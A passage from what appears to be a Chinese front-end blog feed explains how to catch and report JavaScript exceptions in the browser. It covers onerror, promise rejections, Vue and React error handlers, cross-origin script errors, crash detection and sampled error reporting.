class="line">  <span class="title class_">Jartto</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>控制台就不会再有这样的错误了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Uncaught</span> <span class="title class_">ReferenceError</span>: <span class="title class_">Jartto</span> is not defined</span><br><span class="line">    at <span class="built_in">setTimeout</span> ((index):<span class="number">36</span>)</span><br></pre></td></tr></table></figure><p>需要注意：<br /><code>onerror</code> 最好写在所有 <code>JS</code> 脚本的前面，否则有可能捕获不到错误；<br /><code>onerror</code> 无法捕获语法错误；<br />到这里基本就清晰了：在实际的使用过程中，<code>onerror</code> 主要是来捕获预料之外的错误，而 <code>try-catch</code> 则是用来在可预见情况下监控特定的错误，两者结合使用更加高效。</p><blockquote><p>问题又来了，捕获不到静态资源加载异常怎么办？</p></blockquote><p><a name="d6FmC"></a></p><h4 id="window-addEventListener"><a href="#window-addEventListener" class="headerlink" title="window.addEventListener"></a>window.addEventListener</h4><p>当一项资源（如图片或脚本）加载失败，加载资源的元素会触发一个 <code>Event</code> 接口的 <code>error</code> 事件，并执行该元素上的<code>onerror()</code> 处理函数。这些 <code>error</code> 事件不会向上冒泡到 <code>window</code> ，不过（至少在 <code>Firefox</code> 中）能被单一的<code>window.addEventListener</code> 捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;scritp&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;捕获到异常：&#x27;</span>, error);</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./jartto.png&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>控制台输出：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1593769169489-3ff60f7f-dfe6-4fee-872b-0605f51674ae.png#height=61&id=vvnzJ&originHeight=61&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13707&status=done&style=none&title=&width=830" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1593769169489-3ff60f7f-dfe6-4fee-872b-0605f51674ae.png#height=61&id=vvnzJ&originHeight=61&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13707&status=done&style=none&title=&width=830" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />由于网络请求异常不会事件冒泡，因此必须在捕获阶段将其捕捉到才行，但是这种方式虽然可以捕捉到网络请求的异常，但是无法判断 <code>HTTP</code> 的状态是 <code>404</code> 还是其他比如 <code>500</code> 等等，所以还需要配合服务端日志才进行排查分析才可以。<br />需要注意：</p><ul><li>不同浏览器下返回的 <code>error</code> 对象可能不同，需要注意兼容处理。</li><li>需要注意避免 <code>addEventListener</code> 重复监听。</li></ul><p><a name="E3DKU"></a></p><h4 id="Promise-Catch"><a href="#Promise-Catch" class="headerlink" title="Promise Catch"></a>Promise Catch</h4><blockquote><p>在 <code>promise</code> 中使用 <code>catch</code> 可以非常方便的捕获到异步 <code>error</code> ，这个很简单。</p></blockquote><p>没有写 <code>catch</code> 的 <code>Promise</code> 中抛出的错误无法被 <code>onerror</code> 或 <code>try-catch</code> 捕获到，所以我们务必要在 <code>Promise</code> 中不要忘记写 <code>catch</code> 处理抛出的异常。<br />解决方案： 为了防止有漏掉的 <code>Promise</code> 异常，建议在全局增加一个对 <code>unhandledrejection</code> 的监听，用来全局监听<code>Uncaught Promise Error</code>。使用方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们继续来尝试一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;promise error&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到如下输出：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1593769233296-009a130c-ab85-4015-8939-49a0bb66af62.png#height=472&id=BCxsN&originHeight=472&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81920&status=done&style=none&title=&width=871" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1593769233296-009a130c-ab85-4015-8939-49a0bb66af62.png#height=472&id=BCxsN&originHeight=472&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81920&status=done&style=none&title=&width=871" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />那如果对 <code>Promise</code> 不进行 <code>catch</code> 呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unhandledrejection&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, e);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="string">&quot;jartto: promise error&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>嗯，事实证明，也是会被正常捕获到的。</p></blockquote><p>所以，正如我们上面所说，为了防止有漏掉的 <code>Promise</code> 异常，建议在全局增加一个对 <code>unhandledrejection</code> 的监听，用来全局监听 <code>Uncaught Promise Error</code>。<br />补充一点：如果去掉控制台的异常显示，需要加上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.<span class="title function_">preventDefault</span>();</span><br></pre></td></tr></table></figure><p><a name="ctAjd"></a></p><h4 id="VUE-errorHandler"><a href="#VUE-errorHandler" class="headerlink" title="VUE errorHandler"></a>VUE errorHandler</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">errorHandler</span> = <span class="function">(<span class="params">err, vm, info</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;通过vue errorHandler捕获的错误&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(vm);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(info);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="goIiu"></a></p><h4 id="React-异常捕获"><a href="#React-异常捕获" class="headerlink" title="React 异常捕获"></a>React 异常捕获</h4><p><code>React 16</code> 提供了一个内置函数 <code>componentDidCatch</code>，使用它可以非常简单的获取到 <code>react</code> 下的错误信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">componentDidCatch</span>(<span class="params">error, info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error, info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外，我们可以了解一下：<code>[error boundary](https://blog.csdn.net/a986597353/article/details/78469979)</code><br /><code>UI</code> 的某部分引起的 <code>JS</code> 错误不应该破坏整个程序，为了帮 <code>React</code> 的使用者解决这个问题，<code>React 16</code> 介绍了一种关于错误边界（<code>error boundary</code>)的新观念。</p><blockquote><p>需要注意的是： error boundaries 并不会捕捉下面这些错误。</p></blockquote><p>1.事件处理器<br />2.异步代码<br />3.服务端的渲染代码<br />4.在 <code>error boundaries</code> 区域内的错误</p><p>我们来举一个小例子，在下面这个 <code>componentDIdCatch(error,info)</code> 里的类会变成一个 <code>error boundary</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorBoundary</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">hasError</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">componentDidCatch</span>(<span class="params">error, info</span>) &#123;</span><br><span class="line">    <span class="comment">// Display fallback UI</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">hasError</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    <span class="comment">// You can also log the error to an error reporting service</span></span><br><span class="line">    <span class="title function_">logErrorToMyService</span>(error, info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">hasError</span>) &#123;</span><br><span class="line">      <span class="comment">// You can render any custom fallback UI</span></span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Something went wrong.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">children</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们像使用普通组件那样使用它：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ErrorBoundary</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">MyWidget</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">ErrorBoundary</span>&gt;</span><br></pre></td></tr></table></figure><p><code>componentDidCatch()</code> 方法像 <code>JS</code> 的 <code>catch&#123;&#125;</code> 模块一样工作，但是对于组件，只有 <code>class</code> 类型的组件(<code>class component</code> )可以成为一个 <code>error boundaries</code> 。<br />实际上，大多数情况下我们可以在整个程序中定义一个 <code>error boundary</code> 组件，之后就可以一直使用它了！</p><p><a name="sWUgU"></a></p><h4 id="iframe-异常"><a href="#iframe-异常" class="headerlink" title="iframe 异常"></a>iframe 异常</h4><p>对于 <code>iframe</code> 的异常捕获，我们还得借力 <code>window.onerror</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到异常：&quot;</span>, &#123; message, source, lineno, colno, error &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个简单的例子可能如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./iframe.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;捕获到 iframe 异常：&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      message,</span></span><br><span class="line"><span class="language-javascript">      source,</span></span><br><span class="line"><span class="language-javascript">      lineno,</span></span><br><span class="line"><span class="language-javascript">      colno,</span></span><br><span class="line"><span class="language-javascript">      error,</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="yQqqP"></a></p><h4 id="Script-error"><a href="#Script-error" class="headerlink" title="Script error"></a>Script error</h4><p>一般情况，如果出现 <code>Script error</code> 这样的错误，基本上可以确定是出现了跨域问题。这时候，是不会有其他太多辅助信息的，但是解决思路无非如下：</p><blockquote><p>跨源资源共享机制( <code>CORS</code> )：我们为 <code>script</code> 标签添加 <code>crossOrigin</code> 属性。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://jartto.wang/main.js&quot;</span> <span class="attr">crossorigin</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者动态去添加 <code>js</code> 脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><blockquote><p>特别注意，服务器端需要设置：Access-Control-Allow-Origin</p></blockquote><p>此外，我们也可以试试这个-<a href="https://juejin.im/post/5c00a405f265da610e7fd024">解决 Script Error 的另类思路</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> originAddEventListener = <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span>;</span><br><span class="line"><span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span> = <span class="keyword">function</span> (<span class="params">type, listener, options</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> wrappedListener = <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> listener.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> originAddEventListener.<span class="title function_">call</span>(<span class="variable language_">this</span>, type, wrappedListener, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单解释一下：</p><ul><li>改写了 <code>EventTarget</code> 的 <code>addEventListener</code> 方法；</li><li>对传入的 <code>listener</code> 进行包装，返回包装过的 <code>listener</code>，对其执行进行 <code>try-catch</code>；</li><li>浏览器不会对 <code>try-catch</code> 起来的异常进行跨域拦截，所以 <code>catch</code> 到的时候，是有堆栈信息的；</li><li>重新 <code>throw</code> 出来异常的时候，执行的是同域代码，所以 <code>window.onerror</code> 捕获的时候不会丢失堆栈信息；</li></ul><p>利用包装 <code>addEventListener</code>，我们还可以达到「扩展堆栈」的效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="keyword">const</span> originAddEventListener = <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span>;</span><br><span class="line">   <span class="title class_">EventTarget</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addEventListener</span> = <span class="keyword">function</span> (<span class="params">type, listener, options</span>) &#123;</span><br><span class="line">+    <span class="comment">// 捕获添加事件时的堆栈</span></span><br><span class="line">+    <span class="keyword">const</span> addStack = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Event (<span class="subst">$&#123;type&#125;</span>)`</span>).<span class="property">stack</span>;</span><br><span class="line">     <span class="keyword">const</span> wrappedListener = <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> listener.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">+        <span class="comment">// 异常发生时，扩展堆栈</span></span><br><span class="line">+        err.<span class="property">stack</span> += <span class="string">&#x27;\n&#x27;</span> + addStack;</span><br><span class="line">         <span class="keyword">throw</span> err;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> originAddEventListener.<span class="title function_">call</span>(<span class="variable language_">this</span>, type, wrappedListener, options);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)();</span><br></pre></td></tr></table></figure><p><a name="vk1qk"></a></p><h4 id="崩溃和卡顿"><a href="#崩溃和卡顿" class="headerlink" title="崩溃和卡顿"></a>崩溃和卡顿</h4><p>卡顿也就是网页暂时响应比较慢， <code>JS</code> 可能无法及时执行。但崩溃就不一样了，网页都崩溃了，<code>JS</code> 都不运行了，还有什么办法可以监控网页的崩溃，并将网页崩溃上报呢？</p><blockquote><p>崩溃和卡顿也是不可忽视的，也许会导致你的用户流失。</p></blockquote><p>1.利用 <code>window</code> 对象的 <code>load</code> 和 <code>beforeunload</code> 事件实现了网页崩溃的监控。<br />不错的文章，推荐阅读：<a href="http://jasonjl.me/blog/2015/06/21/taking-action-on-browser-crashes/">Logging Information on Browser Crashes</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;good_exit&quot;</span>, <span class="string">&quot;pending&quot;</span>);</span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;time_before_crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toString</span>());</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;beforeunload&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;good_exit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;good_exit&quot;</span>) &amp;&amp;</span><br><span class="line">  <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;good_exit&quot;</span>) !== <span class="string">&quot;true&quot;</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">        insert crash logging code here</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="title function_">alert</span>(</span><br><span class="line">    <span class="string">&quot;Hey, welcome back from your crash, looks like you crashed on: &quot;</span> +</span><br><span class="line">      <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;time_before_crash&quot;</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.基于以下原因，我们可以使用 <code>Service Worker</code> 来实现<a href="https://juejin.im/entry/5be158116fb9a049c6434f4a?utm_source=gold_browser_extension">网页崩溃的监控</a>：</p><ul><li><code>Service Worker</code> 有自己独立的工作线程，与网页区分开，网页崩溃了，<code>Service Worker</code> 一般情况下不会崩溃；</li><li><code>Service Worker</code> 生命周期一般要比网页还要长，可以用来监控网页的状态；</li><li>网页可以通过 <code>navigator.serviceWorker.controller.postMessage API</code> 向掌管自己的 <code>SW</code> 发送消息。</li><li><br /><a name="RJS5Y"></a></li></ul><h4 id="错误上报"><a href="#错误上报" class="headerlink" title="错误上报"></a>错误上报</h4><p>1.通过 <code>Ajax</code> 发送数据<br />因为 <code>Ajax</code> 请求本身也有可能会发生异常，而且有可能会引发跨域问题，一般情况下更推荐使用动态创建 <code>img</code> 标签的形式进行上报。<br />2.动态创建 <code>img</code> 标签的形式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">report</span>(<span class="params">error</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> reportUrl = <span class="string">&quot;http://jartto.wang/report&quot;</span>;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;reportUrl&#125;</span>?logs=<span class="subst">$&#123;error&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收集异常信息量太多，怎么办？实际中，我们不得不考虑这样一种情况：如果你的网站访问量很大，那么一个必然的错误发送的信息就有很多条，这时候，我们需要设置采集率，从而<a href="https://github.com/happylindz/blog/issues/5">减缓服务器的压力</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reporter</span>.<span class="property">send</span> = <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="comment">// 只采集 30%</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.3</span>) &#123;</span><br><span class="line">    <span class="title function_">send</span>(data); <span class="comment">// 上报错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>采集率应该通过实际情况来设定，随机数，或者某些用户特征都是不错的选择。</p><p><a name="PnbNm"></a></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>回到我们开头提出的那个问题，如何优雅的处理异常呢？<br />1.可疑区域增加 <code>Try-Catch</code><br />2.全局监控 <code>JS</code> 异常 <code>window.onerror</code><br />3.全局监控静态资源异常 <code>window.addEventListener</code><br />4.捕获没有 <code>Catch</code> 的 <code>Promise</code> 异常：<code>unhandledrejection</code><br />5.<code>VUE errorHandler</code> 和 <code>React componentDidCatch</code><br />6.监控网页崩溃：<code>window</code> 对象的 <code>load</code> 和 <code>beforeunload</code><br />7.跨域 <code>crossOrigin</code> 解决<br />其实很简单，正如<a href="http://jartto.wang/2018/11/20/js-exception-handling/">上文</a>所说：采用组合方案，分类型的去捕获异常，这样基本 80%-90% 的问题都化于无形。</p><p><a name="nwDGU"></a></p><h2 id="SDK-埋点"><a href="#SDK-埋点" class="headerlink" title="SDK 埋点"></a>SDK 埋点</h2><p>最后一个是前端 sdk 埋点，直接开发一个 js 文件，统计用户的 UV&#x2F;PV 分析等等，比如用户的转化率之类的。</p><p><a name="fAdTU"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://jasonjl.me/blog/2015/06/21/taking-action-on-browser-crashes/">Logging Information on Browser Crashes</a><br /><a href="https://github.com/happylindz/blog/issues/5">前端代码异常监控实战</a><br /><a href="https://blog.csdn.net/a986597353/article/details/78469979">Error Boundaries</a><br /><a href="https://github.com/RicardoCao-Biker/Front-End-Monitoring/blob/master/BasicKnowledge.md">前端监控知识点</a><br /><a href="https://blog.sentry.io/2016/01/04/client-javascript-reporting-window-onerror">Capture and report JavaScript errors with window.onerror</a></p><blockquote><p>文章中“异常监控”中的内容来自于  <a href="http://jartto.wang/">Jartto’s blog </a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端监控 SDK 的一些技术要点原理分析</title>
      <link href="/2023/06/28/frontend/monitor/qian-duan-jian-kong-sdk-de-yi-xie-ji-zhu-yao-dian-yuan-li-fen-xi/"/>
      <url>/2023/06/28/frontend/monitor/qian-duan-jian-kong-sdk-de-yi-xie-ji-zhu-yao-dian-yuan-li-fen-xi/</url>
      
